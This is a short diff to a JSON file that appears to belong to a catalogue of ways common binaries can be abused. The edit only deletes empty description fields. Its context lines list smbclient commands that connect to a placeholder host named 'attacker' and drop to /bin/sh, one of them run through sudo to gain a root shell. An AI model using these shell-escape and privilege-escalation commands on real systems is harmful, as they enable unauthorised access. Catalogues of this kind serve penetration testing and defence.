@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "smbclient '\\\\attacker\\share'\n!/bin/sh\n"
       }
     ],
@@ -20,7 +20,7 @@
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
       }
     ]
